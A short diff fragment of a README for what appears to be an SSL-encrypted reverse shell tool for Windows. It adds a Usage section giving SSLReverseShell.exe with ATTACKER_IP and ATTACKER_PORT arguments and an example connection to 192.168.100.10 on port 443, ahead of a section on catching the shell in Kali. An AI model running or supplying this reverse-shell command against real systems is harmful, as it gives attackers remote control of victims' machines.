@@ -88,6 +88,15 @@ C:\OpenSSLWin64\install\lib\libcrypto.lib
 
 ---
 
+## Usage
+
+```
+Usage: C:\Users\Vixx\Downloads\SSLReverseShell.exe <ATTACKER_IP> <ATTACKER_PORT>
+Example: SSLReverseShell.exe 192.168.100.10 443
+```
+
+---
+
 ## Capture the reverse shell in your Kali OS
 
 1- Generate a New RSA Private Key and Self-Signed Certificate (Containing the Public Key)
